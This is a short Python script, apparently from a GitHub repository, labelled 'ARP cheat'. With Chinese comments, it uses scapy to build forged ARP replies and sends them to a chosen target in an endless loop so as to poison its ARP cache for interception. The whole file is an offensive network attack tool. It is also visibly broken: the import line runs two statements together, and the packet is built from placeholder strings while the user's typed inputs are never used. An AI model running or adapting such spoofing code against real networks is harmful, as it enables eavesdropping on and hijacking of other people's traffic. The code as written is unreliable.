# beloved/DHS
"""
==========================================
Name:ARP cheat Author: Lalevin Martin
 Mailbox: zzlyxht@outlook.com                                                
 Github: http://github.com/nacglalevin
Written in 2024-4-22
==================NACG==================
"""
import os
from scapy.all import ARP, Ether, sendpimport time

os.system("clear")
os.system("figlet ARP NACG")
# 定义欺骗的目标IP和MAC地址
target_ip = "ip"
ip = input("请输入攻击 IP     : ")
target_mac = "mac"
mac = input("请输入攻击MAC   :")

# 定义欺骗者的IP和MAC地址
spoof_ip = "mip"
mip = input("请输入本机 IP     : ")
spoof_mac = "mmac"
mmac= input("请输入本机 MAC    : ")


# 创建ARP响应包
arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip,hwsrc=spoof_mac)

# 创建以太网帧
ethernet_frame = Ether(dst=target_mac, src=spoof_mac)

# 组合ARP响应包和以太网帧
packet = ethernet_frame / arp_response

# 发送欺骗包，每次发送间隔1秒
while True:
  sendp(packet, iface="eth0")   
  time.sleep(1)
